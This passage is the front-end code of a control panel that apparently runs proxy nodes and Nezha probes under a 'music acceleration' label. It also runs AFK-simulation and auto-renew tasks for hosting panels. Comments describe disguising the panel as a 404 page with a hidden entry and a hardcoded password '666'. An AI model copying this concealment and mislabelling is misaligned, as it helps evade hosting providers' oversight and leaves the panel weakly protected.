<div id="modal-new-task" class="modal-overlay fixed inset-0 bg-black/70 backdrop-blur-sm z-[60] flex items-center justify-center p-4" style="display:none">
<div class="glass rounded-2xl w-full max-w-sm border border-amber-500/30 shadow-2xl p-5">
<h3 class="text-lg font-extrabold text-amber-400 mb-4 flex items-center gap-2"><span>➕</span> 创建新任务</h3>
<input id="new-task-name" placeholder="任务名称 (如: 续期甲, AFK乙)" class="input-dark w-full rounded-xl px-3 py-2.5 text-sm text-white mb-3">
<select id="new-task-type" class="select-dark w-full rounded-xl px-3 py-2.5 text-sm text-white mb-4">
<option value="cron">⏰ 定时访问</option>
<option value="afk">🎮 AFK 模拟</option>
<option value="renew">🔄 自动续期</option>
</select>
<div class="flex gap-3">
<button id="btn-confirm-add-task" class="flex-1 bg-emerald-600/80 hover:bg-emerald-600 text-white py-2.5 rounded-xl text-sm font-bold cursor-pointer">✅ 确认创建</button>
<button id="btn-cancel-add-task" class="flex-1 bg-slate-700/80 hover:bg-slate-600 text-slate-300 py-2.5 rounded-xl text-sm font-bold cursor-pointer">取消</button>
</div>
</div>
</div>

<script>
(function(){
var btn=document.getElementById('auth-btn'),inp=document.getElementById('auth-pwd'),scr=document.getElementById('auth-screen'),main=document.getElementById('main-content'),err=document.getElementById('auth-err');
function doAuth(){
    if(inp.value==='666'){
        try{sessionStorage.setItem('pf_auth','1')}catch(e){}
        scr.style.display='none';scr.style.pointerEvents='none';scr.style.zIndex='-1';
        main.style.display='';
        var wa=document.getElementById('welcome-audio');
        if(wa){wa.volume=.8;wa.play().catch(function(){});}
    }else{
        err.style.display='';inp.value='';setTimeout(function(){err.style.display='none'},2000)
    }
}
btn.onclick=doAuth;inp.onkeydown=function(e){if(e.key==='Enter')doAuth()};
// 伪装页面: 404样式已固定为easydss格式，无需语言切换
// 隐藏入口: easydss/1.13[点这里].0 中13后面的那个"."
// 已输入密码: 刷新后跳过404直接进入; 未输入密码: 显示404伪装页面
try{if(sessionStorage.getItem('pf_auth')==='1'){scr.style.display='none';scr.style.pointerEvents='none';scr.style.zIndex='-1';main.style.display='';var wa=document.getElementById('welcome-audio');if(wa){wa.volume=.8;wa.play().catch(function(){})}}}catch(e){}
})();
<\/script>

<script>
// 全局错误兜底 - 防止任何JS报错导致按钮失效
window.onerror=function(){return true};
window.onunhandledrejection=function(){return true};
function escapeHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}
function unitLabel(u){return{sec:'秒',min:'分钟',hour:'小时',day:'天',month:'月'}[u]||u}
var drafts={};
function saveDraft(b,f,v){if(!drafts[b])drafts[b]={};drafts[b][f]=v}
function getDraft(b,f,d){return(drafts[b]&&drafts[b][f]!==undefined)?drafts[b][f]:(d||'')}
// ===== 哪吒配置输入框持久化(输入永不清空，刷新页面也保留) =====
var _nzLS_PREFIX='_nz_';
var _nzInputIds=['nz-addr','nz-key']; // 需要持久化的输入框ID
// 保存到localStorage
function _nzSaveLS(e){
    try{localStorage.setItem(_nzLS_PREFIX+e.target.id,e.target.value)}catch(x){}
}
// 页面加载时从localStorage恢复
function _nzRestoreLS(){
    _nzInputIds.forEach(function(id){
        var el=document.getElementById(id);if(!el)return;
        try{var v=localStorage.getItem(_nzLS_PREFIX+id);if(v!==null&&v!=='')el.value=v}catch(x){}
    });
    try{var t=localStorage.getItem(_nzLS_PREFIX+'nz-tls');if(t!==null)document.getElementById('nz-tls').checked=t==='true'}catch(x){}
}
// 绑定input事件：实时保存
_nzInputIds.forEach(function(id){
    var el=document.getElementById(id);if(el)el.addEventListener('input',_nzSaveLS);
});
document.getElementById('nz-tls').addEventListener('change',function(){
    try{localStorage.setItem(_nzLS_PREFIX+'nz-tls',this.checked)}catch(x){}
});
// 页面加载时立即恢复
_nzRestoreLS();

// ===== 用户模式预览选择(仅影响按钮高亮和配置区标题，不影响lw-*功能区) =====
var _nzPreviewMode=null; // null=未预选, 'pure'=纯JS预览, 'laowang'=老王预览
var _serverMode='pure'; // 服务器实际运行模式(由loadNezhaStatus轮询更新)
var _serverRunning=false; // 服务器是否正在运行(由loadNezhaStatus轮询更新)
function getSelectedMode(){if(_nzPreviewMode)return _nzPreviewMode;return document.getElementById('nz-pure-btn').classList.contains('bg-purple-600')||document.getElementById('nz-pure-btn').classList.contains('bg-purple-600/80')?'pure':'laowang'}

function openAppCenter(){document.getElementById('modal-app-center').classList.add('active');showAppView('list')}
function closeAppCenter(){document.getElementById('modal-app-center').classList.remove('active')}
function openTavern(){document.getElementById('modal-tavern').classList.add('active');try{loadTavernData()}catch(e){}}
function closeTavern(){document.getElementById('modal-tavern').classList.remove('active')}

function showAppView(v){var modal=document.getElementById('modal-app-center');modal.querySelectorAll('.view-section').forEach(function(e){e.classList.remove('active-view')});document.getElementById('view-'+v).classList.add('active-view');try{if(v==='ff')loadFFStatus();if(v==='music'){loadMusicStatus();loadNezhaStatus()}if(v==='node')loadNodeConfig();if(v==='files')loadFileList()}catch(e){}}

document.getElementById('btn-app-center').onclick=openAppCenter;
document.getElementById('btn-tavern').onclick=openTavern;
document.getElementById('btn-add-bot').onclick=async function(){await fetch('/api/bots',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:document.getElementById('h').value,username:document.getElementById('u').value})});updateUI(true)};

document.getElementById('modal-app-center').addEventListener('click',function(e){
var t=e.target.closest('.nav-ff');if(t){showAppView('ff');return}
t=e.target.closest('.nav-music');if(t){showAppView('music');return}
t=e.target.closest('.nav-node');if(t){showAppView('node');return}
t=e.target.closest('.nav-files');if(t){showAppView('files');return}
t=e.target.closest('.nav-list');if(t){showAppView('list');return}
t=e.target.closest('.close-app-center');if(t){closeAppCenter();return}
});

document.getElementById('ff-btn-start').onclick=async function(){try{var p={FF_PASS:document.getElementById('ff-pass').value,FF_PORT:document.getElementById('ff-port').value,ARGO_DOMAIN:document.getElementById('ff-argo-domain').value,ARGO_AUTH:document.getElementById('ff-argo-auth').value};await fetch('/api/apps/firefox/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({params:p})});loadFFStatus()}catch(e){}};
document.getElementById('ff-btn-stop').onclick=async function(){try{await fetch('/api/apps/firefox/stop',{method:'POST'});loadFFStatus()}catch(e){}};
document.getElementById('ff-btn-uninstall').onclick=async function(){if(!confirm('确认卸载？'))return;try{await fetch('/api/apps/firefox/uninstall',{method:'DELETE'});loadFFStatus()}catch(e){}};

// ===== 统一启动/停止按钮 =====
document.getElementById('btn-start').onclick=async function(){try{
    var isPure=getSelectedMode()==='pure';
    var mode=isPure?'pure':'laowang';
    var addr=document.getElementById('nz-addr').value.trim();
    var key=document.getElementById('nz-key').value.trim();
    var tls=document.getElementById('nz-tls').checked;
    if(!addr||!key){alert('请填写面板地址和密钥');return}
    // 如果已经在运行，必须先停止才能切换模式
    if(_serverRunning){
        var currentLabel=_serverMode==='pure'?'纯Node模式':'老王模式';
        var selectLabel=isPure?'纯Node模式':'老王模式';
        if(_serverMode!==mode){alert('⚠️ 当前正在运行'+currentLabel+'，请先点「停止」再切换到'+selectLabel+'！');return}
        else{alert('⚠️ '+currentLabel+'已在运行中！');return}
    }
    // 启动哪吒探针(根据模式)
    await fetch('/api/nezha/config',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({addr:addr,key:key,tls:tls,mode:mode})});
    // 启动后同步到localStorage，确保刷新后仍保留
    try{localStorage.setItem(_nzLS_PREFIX+'nz-addr',addr);localStorage.setItem(_nzLS_PREFIX+'nz-key',key);localStorage.setItem(_nzLS_PREFIX+'nz-tls',String(tls))}catch(x){}
    // 老王模式同时启动音乐加速
    if(!isPure){
        var p={UUID:document.getElementById('m-uuid').value,ARGO_DOMAIN:document.getElementById('m-argo-domain').value,ARGO_AUTH:document.getElementById('m-argo-auth').value,ARGO_PORT:document.getElementById('m-argo-port').value,NAME:document.getElementById('m-name').value,NEZHA_SERVER:document.getElementById('m-nezha-server').value,NEZHA_PORT:document.getElementById('m-nezha-port').value,NEZHA_KEY:document.getElementById('m-nezha-key').value,CFIP:document.getElementById('m-cfip').value,CFPORT:document.getElementById('m-cfport').value,HY2_PORT:document.getElementById('m-hy2-port').value,REALITY_PORT:document.getElementById('m-reality-port').value,TUIC_PORT:document.getElementById('m-tuic-port').value};
        try{var r=await fetch('/api/apps/music/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({params:p})});var d=await r.json();if(!d.success&&d.msg)alert('❌ 音乐加速启动失败: '+d.msg)}catch(e){alert('❌ 音乐加速请求失败')}
    }
    _nzPreviewMode=null; // 启动后重置预览选择，让轮询以服务器实际模式更新UI
    loadNezhaStatus();loadMusicStatus();
}catch(e){}};
document.getElementById('btn-stop').onclick=async function(){try{
    await fetch('/api/nezha/stop',{method:'POST'});
    await fetch('/api/apps/music/stop',{method:'POST'});
    _nzPreviewMode=null; // 停止后也重置预览选择
    loadNezhaStatus();loadMusicStatus();
}catch(e){}};

// ===== 提取节点 & 卸载清空按钮 =====
document.getElementById('btn-extract').onclick=async function(){try{var r=await fetch('/api/apps/music/nodes');var d=await r.json();if(!d.success||!d.nodes){alert('❌ 未检测到节点文件');return}var text=d.nodes;if(navigator.clipboard&&navigator.clipboard.writeText){await navigator.clipboard.writeText(text);alert('✅ 已复制节点！')}else{var ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);alert('✅ 已复制节点！')}}catch(e){alert('❌ 提取失败')}};
document.getElementById('btn-uninstall').onclick=async function(){if(!confirm('⚠️ 确认卸载老王模式？将停止进程并清空所有资源文件！'))return;try{await fetch('/api/apps/music/uninstall',{method:'DELETE'});alert('✅ 已卸载清空')}catch(e){alert('❌ 卸载失败')}loadNezhaStatus();loadMusicStatus()};

document.getElementById('btn-add-task').onclick=function(){
    document.getElementById('new-task-name').value='';
    document.getElementById('new-task-type').value='cron';
    var m=document.getElementById('modal-new-task');
    m.classList.add('active');
    m.style.display='';
    document.getElementById('new-task-name').focus();
};
document.getElementById('btn-cancel-add-task').onclick=function(){
    var m=document.getElementById('modal-new-task');
    m.classList.remove('active');
    m.style.display='none';
};
document.getElementById('btn-confirm-add-task').onclick=async function(){
    var type=document.getElementById('new-task-type').value;
    var customName=document.getElementById('new-task-name').value.trim();
    var defaultName=type==='afk'?'AFK 模拟':type==='renew'?'自动续期':'定时访问';
    var name=customName||defaultName;
    var p={name:name,type:type,url:'',method:type==='renew'?'POST':'GET',body:'',interval:type==='afk'?30:type==='renew'?60:5,unit:type==='afk'?'sec':type==='renew'?'min':'min'};
    try{
        var r=await fetch('/api/apps/tavern/tasks',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)});
        if(!r.ok){var er=await r.json();alert('❌ 创建失败: '+(er.msg||'未知错误'));return}
        var m=document.getElementById('modal-new-task');
        m.classList.remove('active');
        m.style.display='none';
        loadTavernData();
    }catch(e){
        console.error('Create task failed:',e);
        alert('❌ 创建任务请求失败');
    }
};

// 点击遮罩关闭创建任务弹窗
document.getElementById('modal-new-task').addEventListener('click',function(e){
    if(e.target===this){
        this.classList.remove('active');
        this.style.display='none';
    }
});

// ===== 酒馆任务系统变量 =====
var _tavernSelectedId = null;
var _tavernTasks = [];
var _tavernLogScroll = {};

// ===== 酒馆任务操作处理 =====
async function handleTaskAction(act, id) {
    try {
        if (act === 'start') {
            await fetch('/api/apps/tavern/tasks/' + id + '/start', { method: 'POST' });
        } else if (act === 'stop') {
            await fetch('/api/apps/tavern/tasks/' + id + '/stop', { method: 'POST' });
        } else if (act === 'delete') {
            if (!confirm('删除此任务？')) return;
            await fetch('/api/apps/tavern/tasks/' + id, { method: 'DELETE' });
            if (_tavernSelectedId === id) {
                _tavernSelectedId = null;
                document.getElementById('tavern-detail-title').innerHTML = '<span>📋</span> 点击上方任务查看详情';
                document.getElementById('tavern-detail-content').innerHTML = '<div class="text-slate-500 opacity-50 text-center text-xs py-8">点击上方任务查看配置与日志</div>';
            }
        } else if (act === 'save-restart') {
            var detailP = document.getElementById('tavern-detail-content');
            if (!detailP) return;
            var name = detailP.querySelector('.task-name').value;
            var url = detailP.querySelector('.task-url').value;
            var method = detailP.querySelector('.task-method').value;
            var bodyEl = detailP.querySelector('.task-body');
            var body = bodyEl ? bodyEl.value : '';
            var interval = parseInt(detailP.querySelector('.task-interval').value) || 5;
            var unit = detailP.querySelector('.task-unit').value;
            var accountEl = detailP.querySelector('.task-account');
            var passwordEl = detailP.querySelector('.task-password');
            var tokenEl = detailP.querySelector('.task-token');
            var account = accountEl ? accountEl.value : '';
            var password = passwordEl ? passwordEl.value : '';
            var token = tokenEl ? tokenEl.value : '';
            var p = { name: name, url: url, method: method, body: body, interval: interval, unit: unit, account: account, password: password, token: token };
            await fetch('/api/apps/tavern/tasks/' + id, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(p) });
            await fetch('/api/apps/tavern/tasks/' + id + '/stop', { method: 'POST' });
            await fetch('/api/apps/tavern/tasks/' + id + '/start', { method: 'POST' });
        } else if (act === 'renew-now') {
            await fetch('/api/apps/tavern/tasks/' + id + '/renew', { method: 'POST' });
        }
        loadTavernData();
    } catch (e) {
        console.error('Task action failed:', e);
    }
}

document.getElementById('modal-tavern').addEventListener('click',function(e){
var t=e.target.closest('.close-tavern');if(t){closeTavern();return}
var t2=e.target.closest('[data-task-act]');if(t2){e.stopPropagation();handleTaskAction(t2.dataset.taskAct,t2.dataset.taskId);return}
// 左侧任务列表点击选中
var sidebarItem=e.target.closest('.task-sidebar-item');if(sidebarItem){
    var tid=sidebarItem.dataset.taskId;
    // 保存当前日志滚动位置
    var oldLog=document.querySelector('#tavern-detail-content .log-box');if(oldLog)_tavernLogScroll[_tavernSelectedId]=oldLog.scrollTop;
    _tavernSelectedId=tid;
    var task=_tavernTasks.find(function(t){return t.id===tid});
    if(task)renderTaskDetail(task);
    // 更新左侧高亮
    var _activeCls='bg-cyan-500/20 border border-cyan-500/30';
    var _inactiveCls='bg-black/20 border border-transparent hover:bg-white/5 hover:border-white/10';
    document.querySelectorAll('.task-sidebar-item').forEach(function(el){el.className=el.className.split(_activeCls).join(_inactiveCls)});
    sidebarItem.className=sidebarItem.className.split(_inactiveCls).join(_activeCls);
    return;
}
});

async function loadTavernData(){
try{var r=await fetch('/api/apps/tavern/tasks');if(!r.ok)return;var d=await r.json();if(!d||!d.tasks)return;
renderTaskList(d.tasks);
}catch(e){console.error('Load tavern data failed:',e);}
}

function renderTaskList(tasks){
try{
_tavernTasks=tasks||[];
var el=document.getElementById('tavern-task-list');
if(!el)return;
if(!tasks||tasks.length===0){el.innerHTML='<div class="text-center text-slate-500 text-xs py-6 opacity-50">暂无任务，点击右上角「创建任务」开始</div>';document.getElementById('tavern-detail-title').innerHTML='<span>📋</span> 点击上方任务查看详情';document.getElementById('tavern-detail-content').innerHTML='<div class="text-slate-500 opacity-50 text-center text-xs py-8">点击上方任务查看配置与日志</div>';return}
var ae=document.activeElement;if(ae&&ae.closest&&(ae.tagName==='INPUT'||ae.tagName==='TEXTAREA'||ae.tagName==='SELECT')&&ae.closest('#tavern-detail-content'))return;
var html='';
tasks.forEach(function(t){
var icon=t.type==='afk'?'🎮':t.type==='renew'?'🔄':'⏰';
var badge=t.running?'<span class="w-2 h-2 rounded-full bg-emerald-400 shrink-0"></span>':'<span class="w-2 h-2 rounded-full bg-slate-600 shrink-0"></span>';
var selected=_tavernSelectedId===t.id;
html+='<div class="task-sidebar-item flex items-center gap-2 px-4 py-3 rounded-xl cursor-pointer transition-all '+(selected?'bg-cyan-500/20 border border-cyan-500/30':'bg-black/20 border border-transparent hover:bg-white/5 hover:border-white/10')+'" data-task-id="'+t.id+'">';
html+='<span class="text-sm">'+icon+'</span>';
html+='<span class="flex-1 text-xs font-bold text-white truncate">'+escapeHtml(t.name)+'</span>';
html+=badge;
html+='<button data-task-act="delete" data-task-id="'+t.id+'" class="w-5 h-5 rounded-full bg-slate-800 hover:bg-red-600 text-slate-600 hover:text-white transition-colors flex items-center justify-center text-[9px] font-bold cursor-pointer shrink-0" title="删除">✕</button>';
html+='</div>';
});
el.innerHTML=html;
// 如果有选中的任务，渲染下方详情
if(_tavernSelectedId){
    var task=tasks.find(function(t){return t.id===_tavernSelectedId});
    if(task)renderTaskDetail(task);
}
}catch(e){console.error('Render task list failed:',e);}
}

function renderTaskDetail(t){
try{
var titleEl=document.getElementById('tavern-detail-title');
var contentEl=document.getElementById('tavern-detail-content');
var icon=t.type==='afk'?'🎮':t.type==='renew'?'🔄':'⏰';
var badge=t.running?'<span class="px-1.5 py-0.5 rounded-full text-[9px] font-bold bg-emerald-500/20 text-emerald-400">运行中</span>':'<span class="px-1.5 py-0.5 rounded-full text-[9px] font-bold bg-slate-700 text-slate-400">离线</span>';
titleEl.innerHTML='<span>'+icon+'</span> '+escapeHtml(t.name)+' '+badge;
var html='';
html+='<div class="space-y-2 p-3 bg-black/30 rounded-xl border border-white/5">';
html+='<div class="flex justify-between items-center"><span class="text-[10px] text-slate-400 font-bold uppercase tracking-wider">任务配置</span><button data-task-act="delete" data-task-id="'+t.id+'" class="text-[10px] bg-red-600/20 hover:bg-red-600/50 text-red-400 px-2 py-0.5 rounded cursor-pointer">🗑 删除</button></div>';
html+='<div class="flex gap-2 items-center"><span class="text-[10px] text-slate-400 shrink-0">名称</span><input class="task-name input-dark w-full rounded-lg px-2 py-1.5 text-xs text-white" value="'+escapeHtml(t.name)+'" placeholder="任务名称"></div>';
if(t.type==='renew'){
    // 续期任务: 续期URL + 请求方式
    html+='<input class="task-url input-dark w-full rounded-lg px-2 py-1.5 text-xs text-white" value="'+escapeHtml(t.url)+'" placeholder="续期 URL (面板续期页面地址)">';
    html+='<div class="flex gap-2">';
    html+='<select class="task-method select-dark rounded-lg px-2 py-1.5 text-xs text-white flex-1">';
    html+='<option value="GET"'+(t.method==='GET'?' selected':'')+'>GET (简单续期)</option>';
    html+='<option value="POST"'+(t.method==='POST'?' selected':'')+'>POST (表单提交)</option>';
    html+='<option value="PATCH"'+(t.method==='PATCH'?' selected':'')+'>PATCH (API续期)</option>';
    html+='</select>';
    html+='</div>';
    html+='<textarea class="task-body input-dark w-full rounded-lg px-2 py-1.5 text-xs text-white h-14 font-mono" placeholder="POST/PATCH Body (JSON格式, 可选)" style="resize:none">'+escapeHtml(t.body||'')+'</textarea>';
}else{
    // 普通任务: GET/POST + URL
    html+='<div class="flex gap-2">';
    html+='<select class="task-method select-dark rounded-lg px-2 py-1.5 text-xs text-white w-20">';
    html+='<option value="GET"'+(t.method==='GET'?' selected':'')+'>GET</option>';
    html+='<option value="POST"'+(t.method==='POST'?' selected':'')+'>POST</option>';
    html+='</select>';
    html+='<input class="task-url input-dark w-full rounded-lg px-2 py-1.5 text-xs text-white" value="'+escapeHtml(t.url)+'" placeholder="请求 URL (必填)">';
    html+='</div>';
    if(t.method==='POST'){
        html+='<textarea class="task-body input-dark w-full rounded-lg px-2 py-1.5 text-xs text-white h-14 font-mono" placeholder="POST Body (JSON格式)" style="resize:none">'+escapeHtml(t.body||'')+'</textarea>';
    }
}
html+='<div class="flex gap-2 items-center"><span class="text-[10px] text-slate-400 shrink-0">间隔</span><input class="task-interval input-dark w-16 rounded-lg px-2 py-1.5 text-xs text-white" type="number" min="1" value="'+t.interval+'" placeholder="间隔"><select class="task-unit select-dark rounded-lg px-2 py-1.5 text-xs text-white flex-1"><option value="sec" '+(t.unit==='sec'?'selected':'')+'>秒</option><option value="min" '+(t.unit==='min'?'selected':'')+'>分钟</option><option value="hour" '+(t.unit==='hour'?'selected':'')+'>小时</option><option value="day" '+(t.unit==='day'?'selected':'')+'>天</option></select></div>';
html+='</div>';
// 认证配置(每个任务独立)
html+='<div class="space-y-2 p-3 bg-black/30 rounded-xl border border-white/5">';
html+='<div class="text-[10px] text-amber-400 font-bold uppercase tracking-wider">🔑 认证配置</div>';
html+='<div class="flex gap-2 items-center"><span class="text-[10px] text-slate-400 shrink-0">账号</span><input class="task-account input-dark w-full rounded-lg px-2 py-1.5 text-xs text-white" value="'+escapeHtml(t.account||'')+'" placeholder="Basic Auth 账号(可选)"></div>';
html+='<div class="flex gap-2 items-center"><span class="text-[10px] text-slate-400 shrink-0">密码</span><input class="task-password input-dark w-full rounded-lg px-2 py-1.5 text-xs text-white" type="password" value="'+escapeHtml(t.password||'')+'" placeholder="Basic Auth 密码(可选)"></div>';
html+='<input class="task-token input-dark w-full rounded-lg px-2 py-1.5 text-xs text-white" value="'+escapeHtml(t.token||'')+'" placeholder="Cookie 或 API Key (自动识别, 可选)">';
html+='</div>';
html+='<div class="flex gap-2">';
if(!t.running){html+='<button data-task-act="start" data-task-id="'+t.id+'" class="flex-1 bg-emerald-600/80 hover:bg-emerald-600 text-white px-3 py-2 rounded-lg text-[11px] font-bold cursor-pointer">▶️ 启动</button>';}
else{html+='<button data-task-act="stop" data-task-id="'+t.id+'" class="flex-1 bg-orange-600/80 hover:bg-orange-600 text-white px-3 py-2 rounded-lg text-[11px] font-bold cursor-pointer">⏹️ 停止</button>';}
html+='<button data-task-act="save-restart" data-task-id="'+t.id+'" class="flex-1 bg-blue-600/80 hover:bg-blue-600 text-white px-3 py-2 rounded-lg text-[11px] font-bold cursor-pointer">💾 保存并重启</button>';
html+='</div>';
if(t.type==='renew'){
html+='<button data-task-act="renew-now" data-task-id="'+t.id+'" class="w-full bg-violet-600/80 hover:bg-violet-600 text-white px-3 py-2 rounded-lg text-[11px] font-bold cursor-pointer">🔄 立即续期</button>';
}
html+='<div class="bg-black/40 rounded-xl border border-white/5 overflow-hidden flex flex-col" style="flex:1 1 0;min-height:120px">';
html+='<div class="px-3 py-1.5 border-b border-white/5 text-[10px] font-bold text-slate-400 uppercase tracking-wider shrink-0">📋 运行日志</div>';
html+='<div data-task-id="'+t.id+'" class="log-box p-2 flex-1 overflow-y-auto font-mono text-[10px]">';
if(t.logs&&t.logs.length>0){t.logs.forEach(function(l){html+='<div class="mb-0.5 '+(l.color||'')+' flex"><span class="opacity-30 mr-1 shrink-0 select-none text-[9px]">['+l.time+']</span><span class="text-[10px]">'+l.msg+'</span></div>'});}
else{html+='<div class="text-slate-500 opacity-50 text-center text-[10px] mt-4">等待操作...</div>'}
html+='</div></div>';
contentEl.innerHTML=html;
// 恢复日志滚动位置
var logBox=contentEl.querySelector('.log-box[data-task-id="'+t.id+'"]');
if(logBox&&_tavernLogScroll[t.id])logBox.scrollTop=_tavernLogScroll[t.id];
}catch(e){console.error('Render task detail failed:',e);}
}

async function loadFFStatus(){try{var r=await fetch('/api/apps/firefox/status');if(!r.ok)return;var d=await r.json();var R=d.running;document.getElementById('ff-btn-start').className='toggle-btn '+(R?'off opacity-50':'bg-emerald-600/90 shadow-lg shadow-emerald-500/30 text-white')+' py-2.5 rounded-xl text-xs font-bold cursor-pointer';document.getElementById('ff-btn-stop').className='toggle-btn '+(R?'bg-orange-600/90 shadow-lg shadow-orange-500/30 text-white':'off opacity-50')+' py-2.5 rounded-xl text-xs font-bold cursor-pointer';if(d.url){document.getElementById('ff-url-box').classList.remove('hidden');document.getElementById('ff-url-link').href=d.url;document.getElementById('ff-url-link').innerHTML='🔗 '+d.url}else{document.getElementById('ff-url-box').classList.add('hidden')}document.getElementById('ff-log-box').innerHTML=renderLogs(d.logs)}catch(e){}}

async function loadMusicStatus(){
try{
    var r=await fetch('/api/apps/music/status');if(!r.ok)return;var d=await r.json();var R=d.running;
    // 提取节点按钮状态
    var extBtn=document.getElementById('btn-extract');extBtn.className=(d.hasNodes?'bg-indigo-600/90 shadow-lg shadow-indigo-500/30 text-white':'bg-slate-700 text-slate-400 opacity-50')+' py-2.5 rounded-xl text-xs font-bold cursor-pointer';
    // 日志 + 节点生成提示
    var logHtml=renderLogs(d.logs,12);
    if(d.hasNodes){logHtml+='<div class="mt-2 py-2 px-3 rounded-lg bg-indigo-500/20 border border-indigo-500/30 text-center text-xs font-bold text-indigo-300 animate-pulse">📢 主人请点击提取！</div>'}
    document.getElementById('music-log-box').innerHTML=logHtml;
    // 节点小灯
    var nodeDot=document.getElementById('m-node-dot'),nodeText=document.getElementById('m-node-status');
    if(d.hasNodes){nodeDot.style.background='#10b981';nodeDot.style.boxShadow='0 0 4px #10b981';nodeText.className='text-[10px] font-bold text-emerald-400';nodeText.innerText='已生成'}
    else if(R){nodeDot.style.background='#eab308';nodeDot.style.boxShadow='0 0 4px #eab308';nodeText.className='text-[10px] font-bold text-yellow-400';nodeText.innerText='生成中'}
    else{nodeDot.style.background='#ef4444';nodeDot.style.boxShadow='0 0 4px #ef4444';nodeText.className='text-[10px] font-bold text-slate-500';nodeText.innerText='未连接'}
    // 自动填UUID
    if(!document.getElementById('m-uuid').value){try{var ur=await fetch('/api/apps/music/uuid');var ud=await ur.json();document.getElementById('m-uuid').value=ud.uuid}catch(e){}}
}catch(e){console.error('Load music status failed:',e);}}

function renderLogs(logs,et){if(!logs||logs.length===0)return'<div class="text-slate-500 opacity-50 text-center mt-'+(et||16)+'">等待操作...</div>';return logs.map(function(l){return'<div class="mb-1 '+(l.color||'')+' flex"><span class="opacity-30 mr-2 shrink-0 select-none">['+l.time+']</span><span>'+l.msg+'</span></div>'}).join('')}

// ===== 节点管理 =====
var _editingNodeId = null;
function renderNodeList(nodes){
    try{
        var el=document.getElementById('node-list');if(!el)return;
        if(!nodes||nodes.length===0){el.innerHTML='';document.getElementById('node-empty').style.display='';return}
        document.getElementById('node-empty').style.display='none';
        var html='';
        nodes.forEach(function(n){
            var icon=n.type==='music'?'🎵':n.type==='nezha'?'📡':n.type==='custom'?'🔧':'🌐';
            var running=n.status==='running';
            var typeLabel=n.type==='music'?'音乐+探针':n.type==='nezha'?'哪吒探针':'自定义';
            html+='<div class="glass rounded-xl p-4 border border-white/5 '+(running?'border-emerald-500/30':'border-red-500/30')+'">';
            html+='<div class="flex justify-between items-center mb-2">';
            html+='<div class="flex items-center gap-2">'+icon+'<span class="text-sm font-bold text-white">'+escapeHtml(n.name)+'</span><span class="px-1.5 py-0.5 rounded text-[9px] font-bold '+(running?'bg-emerald-500/20 text-emerald-400':'bg-slate-700 text-slate-400')+'">'+(running?'运行中':'已停止')+'</span><span class="text-[10px] text-slate-500">'+typeLabel+'</span></div>';
            html+='<div class="flex gap-1">';
            html+='<button data-node-act="test" data-node-id="'+n.id+'" class="text-[10px] bg-slate-700 hover:bg-slate-600 text-white px-2 py-1 rounded cursor-pointer">🔍</button>';
            html+='<button data-node-act="edit" data-node-id="'+n.id+'" class="text-[10px] bg-blue-600/80 hover:bg-blue-600 text-white px-2 py-1 rounded cursor-pointer">✏️</button>';
            html+='<button data-node-act="toggle" data-node-id="'+n.id+'" class="text-[10px] '+(running?'bg-orange-600/80 hover:bg-orange-600':'bg-emerald-600/80 hover:bg-emerald-600')+' text-white px-2 py-1 rounded cursor-pointer">'+(running?'⏹️':'▶️')+'</button>';
            html+='<button data-node-act="delete" data-node-id="'+n.id+'" class="text-[10px] bg-red-600/20 hover:bg-red-600/50 text-red-400 px-2 py-1 rounded cursor-pointer">✕</button>';
            html+='</div></div>';
            html+='<div class="text-[10px] text-slate-500 font-mono">'+escapeHtml(n.server||'auto')+':'+(n.port||'auto')+(n.key?' •***':'')+'</div>';
            html+='</div>';
        });
        el.innerHTML=html;
    }catch(e){console.error('Render node list failed:',e);}
}
async function loadNodeConfig(){
    try{
        var r=await fetch('/api/nodes');if(!r.ok)return;var d=await r.json();
        if(!d||!d.nodes)return;
        renderNodeList(d.nodes);
        _editingNodeId=null;
        document.getElementById('node-name').value='';
        document.getElementById('node-type').value='';
        document.getElementById('node-server').value='';
        document.getElementById('node-port').value='';
        document.getElementById('node-key').value='';
        document.getElementById('node-argod').value='';
        document.getElementById('node-argoa').value='';
        document.getElementById('node-mode').value='pure';
    }catch(e){console.error('Load node config failed:',e);}
}
document.getElementById('node-save').onclick=async function(){
    try{
        var name=document.getElementById('node-name').value.trim();
        var type=document.getElementById('node-type').value.trim()||'custom';
        var server=document.getElementById('node-server').value.trim();
        var port=document.getElementById('node-port').value.trim();
        var key=document.getElementById('node-key').value.trim();
        var argod=document.getElementById('node-argod').value.trim();
        var argoa=document.getElementById('node-argoa').value.trim();
        var mode=document.getElementById('node-mode').value;
        if(!name){alert('请输入节点名称');return}
        var body={name:name,type:type,server:server,port:port,key:key,argod:argod,argoa:argoa,mode:mode};
        if(_editingNodeId){body.id=_editingNodeId}
        var url=_editingNodeId?'/api/nodes/'+_editingNodeId:'/api/nodes';
        var method=_editingNodeId?'PUT':'POST';
        var r=await fetch(url,{method:method,headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
        var d=await r.json();
        if(!d.success){alert('❌ 保存失败: '+(d.msg||'未知错误'));return}
        _editingNodeId=null;
        loadNodeConfig();
    }catch(e){alert('❌ 保存失败')}
};
document.getElementById('node-test').onclick=async function(){
    try{
        var server=document.getElementById('node-server').value.trim();
        if(!server){
            var disc=await fetch('/api/nodes/discover');var d=await disc.json();
            server=(d.server&&d.server.ip)||'127.0.0.1';
            alert('🔍 自动发现: '+server+':'+(d.server&&d.server.port||'25565'));
            document.getElementById('node-server').value=server;
            if(d.server&&d.server.port)document.getElementById('node-port').value=d.server.port;
            return;
        }
        var r=await fetch('/api/nodes/discover');var d=await r.json();
        alert('🔍 可达: '+server+' (本地IP: '+d.localIP+')');
    }catch(e){alert('❌ 测试失败')}
};
document.getElementById('node-auto').onclick=async function(){
    try{
        var name=document.getElementById('node-name').value.trim();
        var type=document.getElementById('node-type').value.trim()||'custom';
        var server=document.getElementById('node-server').value.trim();
        var key=document.getElementById('node-key').value.trim();
        var mode=document.getElementById('node-mode').value;
        if(!server){server='';}
